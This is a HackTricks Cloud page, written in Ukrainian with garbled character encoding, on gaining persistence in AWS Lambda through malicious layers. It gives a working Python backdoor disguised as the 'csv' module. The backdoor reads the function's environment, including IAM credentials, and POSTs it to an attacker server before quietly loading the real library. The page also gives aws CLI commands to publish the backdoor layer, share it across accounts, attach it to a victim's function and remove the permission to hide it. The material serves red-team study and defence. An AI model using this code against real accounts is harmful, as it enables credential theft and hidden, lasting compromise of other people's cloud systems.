# AWS - Lambda Layers Persistence

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Lambda Layers

Lambda layer - —Ü–µ –∞—Ä—Ö—ñ–≤ .zip, —è–∫–∏–π **–º–æ–∂–µ –º—ñ—Å—Ç–∏—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤–∏–π –∫–æ–¥** –∞–±–æ —ñ–Ω—à–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç. –®–∞—Ä –º–æ–∂–µ –º—ñ—Å—Ç–∏—Ç–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, [–∫–∞—Å—Ç–æ–º–Ω–∏–π runtime](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-custom.html), –¥–∞–Ω—ñ –∞–±–æ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω—ñ —Ñ–∞–π–ª–∏.

–ú–æ–∂–Ω–∞ –≤–∫–ª—é—á–∏—Ç–∏ –¥–æ **–ø'—è—Ç–∏ —à–∞—Ä—ñ–≤ –Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—é**. –ö–æ–ª–∏ –≤–∏ –≤–∫–ª—é—á–∞—î—Ç–µ —à–∞—Ä —É —Ñ—É–Ω–∫—Ü—ñ—é, **–≤–º—ñ—Å—Ç –≤–∏—Ç—è–≥—É—î—Ç—å—Å—è –¥–æ –∫–∞—Ç–∞–ª–æ–≥—É `/opt`** –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è.

–ó–∞ **–∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º** —Å—Ç–≤–æ—Ä–µ–Ω—ñ –≤–∞–º–∏ **—à–∞—Ä–∏** —î **–ø—Ä–∏–≤–∞—Ç–Ω–∏–º–∏** –¥–ª—è –≤–∞—à–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É AWS. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–±—Ä–∞—Ç–∏ **–ø–æ–¥—ñ–ª–∏—Ç–∏—Å—è** —à–∞—Ä–æ–º –∑ —ñ–Ω—à–∏–º–∏ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –∑–∞–ø–∏—Å–∞–º–∏ –∞–±–æ **–∑—Ä–æ–±–∏—Ç–∏** —à–∞—Ä **–ø—É–±–ª—ñ—á–Ω–∏–º**. –Ø–∫—â–æ –≤–∞—à—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —à–∞—Ä, –æ–ø—É–±–ª—ñ–∫–æ–≤–∞–Ω–∏–π —ñ–Ω—à–∏–º –æ–±–ª—ñ–∫–æ–≤–∏–º –∑–∞–ø–∏—Å–æ–º, –≤–∞—à—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –º–æ–∂—É—Ç—å **–ø—Ä–æ–¥–æ–≤–∂—É–≤–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤–µ—Ä—Å—ñ—é —à–∞—Ä—É –ø—ñ—Å–ª—è –π–æ–≥–æ –≤–∏–¥–∞–ª–µ–Ω–Ω—è –∞–±–æ –ø—ñ—Å–ª—è –≤—ñ–¥–∫–ª–∏–∫–∞–Ω–Ω—è –≤–∞—à–æ–≥–æ –¥–æ–∑–≤–æ–ª—É –Ω–∞ –¥–æ—Å—Ç—É–ø –¥–æ —à–∞—Ä—É**. –û–¥–Ω–∞–∫ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤—É —Ñ—É–Ω–∫—Ü—ñ—é –∞–±–æ –æ–Ω–æ–≤–∏—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –≤–∏–¥–∞–ª–µ–Ω—É –≤–µ—Ä—Å—ñ—é —à–∞—Ä—É.

–§—É–Ω–∫—Ü—ñ—ó, —Ä–æ–∑–≥–æ—Ä–Ω—É—Ç—ñ —è–∫ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–Ω–µ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è, –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —à–∞—Ä–∏. –ó–∞–º—ñ—Å—Ç—å —Ü—å–æ–≥–æ –≤–∏ —É–ø–∞–∫–æ–≤—É—î—Ç–µ —Å–≤—ñ–π —É–ª—é–±–ª–µ–Ω–∏–π runtime, –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ —Ç–∞ —ñ–Ω—à—ñ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–Ω–µ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –ø—ñ–¥ —á–∞—Å –π–æ–≥–æ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è.

### Python load path

–®–ª—è—Ö –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —è–∫–∏–π Python –±—É–¥–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤ lambda, —î –Ω–∞—Å—Ç—É–ø–Ω–∏–º:
```
['/var/task', '/opt/python/lib/python3.9/site-packages', '/opt/python', '/var/runtime', '/var/lang/lib/python39.zip', '/var/lang/lib/python3.9', '/var/lang/lib/python3.9/lib-dynload', '/var/lang/lib/python3.9/site-packages', '/opt/python/lib/python3.9/site-packages']
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫ **–¥—Ä—É–≥—É** —Ç–∞ —Ç—Ä–µ—Ç—é **–ø–æ–∑–∏—Ü—ñ—ó** –∑–∞–π–º–∞—é—Ç—å –∫–∞—Ç–∞–ª–æ–≥–∏, –¥–µ **lambda layers** —Ä–æ–∑–ø–∞–∫–æ–≤—É—é—Ç—å —Å–≤–æ—ó —Ñ–∞–π–ª–∏: **`/opt/python/lib/python3.9/site-packages`** —Ç–∞ **`/opt/python`**

{% hint style="danger" %}
–Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑–º—ñ–≥ **–≤–Ω–µ–¥—Ä–∏—Ç–∏** –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—É **lambda layer** –∞–±–æ **–¥–æ–¥–∞—Ç–∏ –æ–¥–Ω—É**, —è–∫–∞ –±—É–¥–µ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥, –∫–æ–ª–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –∑–∞–≥–∞–ª—å–Ω–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞**, –≤—ñ–Ω –∑–º–æ–∂–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π –∫–æ–¥ –∑ –∫–æ–∂–Ω–∏–º –≤–∏–∫–ª–∏–∫–æ–º lambda.
{% endhint %}

–û—Ç–∂–µ, –≤–∏–º–æ–≥–∏ —Ç–∞–∫—ñ:

* **–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏**, —è–∫—ñ **–∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å—Å—è** –∫–æ–¥–æ–º –∂–µ—Ä—Ç–≤–∏
* –°—Ç–≤–æ—Ä—ñ—Ç—å **–ø—Ä–æ–∫—Å—ñ-–±—ñ–±–ª—ñ–æ—Ç–µ–∫—É –∑ lambda layers**, —è–∫–∞ –±—É–¥–µ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏–π –∫–æ–¥** —Ç–∞ **–∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—É** –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É.

### –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏

{% hint style="warning" %}
–ö–æ–ª–∏ —è –∑–ª–æ–≤–∂–∏–≤–∞–≤ —Ü—ñ—î—é —Ç–µ—Ö–Ω—ñ–∫–æ—é, —è –∑—ñ—Ç–∫–Ω—É–≤—Å—è –∑ —Ç—Ä—É–¥–Ω–æ—â–∞–º–∏: –¥–µ—è–∫—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ **–≤–∂–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ** –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è python, –∫–æ–ª–∏ –≤–∞—à –∫–æ–¥ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è. –Ø –æ—á—ñ–∫—É–≤–∞–≤ –∑–Ω–∞–π—Ç–∏ —Ç–∞–∫—ñ —Ä–µ—á—ñ, —è–∫ `os` –∞–±–æ `sys`, –∞–ª–µ **–Ω–∞–≤—ñ—Ç—å –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ `json` –±—É–ª–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∞**.\
–©–æ–± –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü—ñ—î—é —Ç–µ—Ö–Ω—ñ–∫–æ—é –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è, –∫–æ–¥ –ø–æ–≤–∏–Ω–µ–Ω **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –Ω–æ–≤—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É, —è–∫–∞ –Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∞**, –∫–æ–ª–∏ –∫–æ–¥ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è.
{% endhint %}

–ó —Ç–∞–∫–∏–º –∫–æ–¥–æ–º –Ω–∞ python –º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ **—Å–ø–∏—Å–æ–∫ –±—ñ–±–ª—ñ–æ—Ç–µ–∫, —è–∫—ñ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ** –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è python –≤ lambda:
```python
import sys

def lambda_handler(event, context):
return {
'statusCode': 200,
'body': str(sys.modules.keys())
}
```
–Ü —Ü–µ **—Å–ø–∏—Å–æ–∫** (–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —â–æ —Ç–∞–∫—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, —è–∫ `os` –∞–±–æ `json`, –≤–∂–µ —î)
```
'sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', '_io', 'marshal', 'posix', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', '_signal', 'encodings.latin_1', '_abc', 'abc', 'io', '__main__', '_stat', 'stat', '_collections_abc', 'genericpath', 'posixpath', 'os.path', 'os', '_sitebuiltins', 'pwd', '_locale', '_bootlocale', 'site', 'types', 'enum', '_sre', 'sre_constants', 'sre_parse', 'sre_compile', '_heapq', 'heapq', 'itertools', 'keyword', '_operator', 'operator', 'reprlib', '_collections', 'collections', '_functools', 'functools', 'copyreg', 're', '_json', 'json.scanner', 'json.decoder', 'json.encoder', 'json', 'token', 'tokenize', 'linecache', 'traceback', 'warnings', '_weakrefset', 'weakref', 'collections.abc', '_string', 'string', 'threading', 'atexit', 'logging', 'awslambdaric', 'importlib._bootstrap', 'importlib._bootstrap_external', 'importlib', 'awslambdaric.lambda_context', 'http', 'email', 'email.errors', 'binascii', 'email.quoprimime', '_struct', 'struct', 'base64', 'email.base64mime', 'quopri', 'email.encoders', 'email.charset', 'email.header', 'math', '_bisect', 'bisect', '_random', '_sha512', 'random', '_socket', 'select', 'selectors', 'errno', 'array', 'socket', '_datetime', 'datetime', 'urllib', 'urllib.parse', 'locale', 'calendar', 'email._parseaddr', 'email.utils', 'email._policybase', 'email.feedparser', 'email.parser', 'uu', 'email._encoded_words', 'email.iterators', 'email.message', '_ssl', 'ssl', 'http.client', 'runtime_client', 'numbers', '_decimal', 'decimal', '__future__', 'simplejson.errors', 'simplejson.raw_json', 'simplejson.compat', 'simplejson._speedups', 'simplejson.scanner', 'simplejson.decoder', 'simplejson.encoder', 'simplejson', 'awslambdaric.lambda_runtime_exception', 'awslambdaric.lambda_runtime_marshaller', 'awslambdaric.lambda_runtime_client', 'awslambdaric.bootstrap', 'awslambdaric.__main__', 'lambda_function'
```
–Ü —Ü–µ —Å–ø–∏—Å–æ–∫ **–±—ñ–±–ª—ñ–æ—Ç–µ–∫**, —è–∫—ñ **lambda –≤–∫–ª—é—á–∞—î –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**: [https://gist.github.com/gene1wood/4a052f39490fae00e0c3](https://gist.github.com/gene1wood/4a052f39490fae00e0c3)

### –ó–∞–¥–Ω—ñ–π —Ö—ñ–¥ –≤ Lambda Layer

–£ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –ø—Ä–∏–ø—É—Å—Ç–∏–º–æ, —â–æ —Ü—ñ–ª—å–æ–≤–∏–π –∫–æ–¥ —ñ–º–ø–æ—Ä—Ç—É—î **`csv`**. –ú–∏ –±—É–¥–µ–º–æ **–∑–∞–¥–Ω—ñ–º —Ö–æ–¥–æ–º —ñ–º–ø–æ—Ä—Ç—É–≤–∞—Ç–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É `csv`**.

–î–ª—è —Ü—å–æ–≥–æ –º–∏ —Å—Ç–≤–æ—Ä–∏–º–æ –¥–∏—Ä–µ–∫—Ç–æ—Ä—ñ—é csv –∑ —Ñ–∞–π–ª–æ–º **`__init__.py`** –≤ –Ω—ñ–π —É —à–ª—è—Ö—É, —è–∫–∏–π –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è lambda: **`/opt/python/lib/python3.9/site-packages`**\
–¢–æ–¥—ñ, –∫–æ–ª–∏ lambda –±—É–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–∞ —ñ —Å–ø—Ä–æ–±—É—î –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ **csv**, –Ω–∞—à **—Ñ–∞–π–ª `__init__.py` –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π —ñ –≤–∏–∫–æ–Ω–∞–Ω–∏–π**.\
–¶–µ–π —Ñ–∞–π–ª –ø–æ–≤–∏–Ω–µ–Ω:

* –í–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—à payload
* –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É csv

–ú–∏ –º–æ–∂–µ–º–æ –∑—Ä–æ–±–∏—Ç–∏ –æ–±–∏–¥–≤–∞ –∑:
```python
import sys
from urllib import request

with open("/proc/self/environ", "rb") as file:
url= "https://attacker13123344.com/" #Change this to your server
req = request.Request(url, data=file.read(), method="POST")
response = request.urlopen(req)

# Remove backdoor directory from path to load original library
del_path_dir = "/".join(__file__.split("/")[:-2])
sys.path.remove(del_path_dir)

# Remove backdoored loaded library from sys.modules
del sys.modules[__file__.split("/")[-2]]

# Load original library
import csv as _csv

sys.modules["csv"] = _csv
```
–¢–æ–¥—ñ —Å—Ç–≤–æ—Ä—ñ—Ç—å zip –∑ —Ü–∏–º –∫–æ–¥–æ–º –∑–∞ —à–ª—è—Ö–æ–º **`python/lib/python3.9/site-packages/__init__.py`** —ñ –¥–æ–¥–∞–π—Ç–µ –π–æ–≥–æ —è–∫ —à–∞—Ä lambda.

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ü–µ–π –∫–æ–¥ –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [**https://github.com/carlospolop/LambdaLayerBackdoor**](https://github.com/carlospolop/LambdaLayerBackdoor)

–Ü–Ω—Ç–µ–≥—Ä–æ–≤–∞–Ω–∏–π payload **–Ω–∞–¥—ñ—à–ª–µ IAM –∫—Ä–µ–¥–µ–Ω—Ü—ñ–∞–ª–∏ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –ü–ï–†–®–ò–ô –†–ê–ó, –∫–æ–ª–∏ –π–æ–≥–æ –≤–∏–∫–ª–∏–∫–∞—é—Ç—å, –∞–±–æ –ü–Ü–°–õ–Ø —Å–∫–∏–¥–∞–Ω–Ω—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ lambda** (–∑–º—ñ–Ω–∞ –∫–æ–¥—É –∞–±–æ —Ö–æ–ª–æ–¥–Ω–∞ lambda), –∞–ª–µ **—ñ–Ω—à—ñ —Ç–µ—Ö–Ω—ñ–∫–∏** —Ç–∞–∫—ñ —è–∫ –Ω–∞—Å—Ç—É–ø–Ω—ñ —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –±—É—Ç–∏ —ñ–Ω—Ç–µ–≥—Ä–æ–≤–∞–Ω—ñ:

{% content-ref url="../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

### –ó–æ–≤–Ω—ñ—à–Ω—ñ —à–∞—Ä–∏

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **—à–∞—Ä–∏ lambda –∑ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤**. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, lambda –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —à–∞—Ä –∑ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —É –Ω—å–æ–≥–æ –Ω–µ–º–∞—î –¥–æ–∑–≤–æ–ª—ñ–≤.\
–¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞ –∫—ñ–ª—å–∫—ñ—Å—Ç—å —à–∞—Ä—ñ–≤, —è–∫—ñ –º–æ–∂–µ –º–∞—Ç–∏ lambda, —Å—Ç–∞–Ω–æ–≤–∏—Ç—å 5**.

–û—Ç–∂–µ, –¥–ª—è –ø–æ–∫—Ä–∞—â–µ–Ω–Ω—è —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–æ—Å—Ç—ñ —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ:

* –ó–∞–¥–Ω—ñ–π –¥–æ—Å—Ç—É–ø –¥–æ —ñ—Å–Ω—É—é—á–æ–≥–æ —à–∞—Ä—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–Ω—ñ—á–æ–≥–æ –Ω–µ —î –∑–æ–≤–Ω—ñ—à–Ω—ñ–º)
* **–°—Ç–≤–æ—Ä–∏—Ç–∏** **—à–∞—Ä** —É **—Å–≤–æ—î–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ**, –Ω–∞–¥–∞—Ç–∏ **–æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—É –∂–µ—Ä—Ç–≤–∏ –¥–æ—Å—Ç—É–ø** –¥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —à–∞—Ä—É, **–Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏** **—à–∞—Ä** —É Lambda –∂–µ—Ä—Ç–≤–∏ —Ç–∞ **–≤–∏–¥–∞–ª–∏—Ç–∏ –¥–æ–∑–≤—ñ–ª**.
* **Lambda** –≤—Å–µ —â–µ –∑–º–æ–∂–µ **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —à–∞—Ä**, –∞ **–∂–µ—Ä—Ç–≤–∞ –Ω–µ** –º–∞—Ç–∏–º–µ –∂–æ–¥–Ω–æ–≥–æ –ø—Ä–æ—Å—Ç–æ–≥–æ —Å–ø–æ—Å–æ–±—É **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –∫–æ–¥ —à–∞—Ä—ñ–≤** (–æ–∫—Ä—ñ–º –æ—Ç—Ä–∏–º–∞–Ω–Ω—è rev shell –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ lambda)
* –ñ–µ—Ä—Ç–≤–∞ **–Ω–µ –ø–æ–±–∞—á–∏—Ç—å –∑–æ–≤–Ω—ñ—à–Ω—ñ —à–∞—Ä–∏**, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –∑ **`aws lambda list-layers`**

{% code overflow="wrap" %}
```bash
# Upload backdoor layer
aws lambda publish-layer-version --layer-name "ExternalBackdoor" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"

# Give everyone access to the lambda layer
## Put the account number in --principal to give access only to an account
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion

## Add layer to victims Lambda

# Remove permissions
aws lambda remove-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1
```
{% endcode %}

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
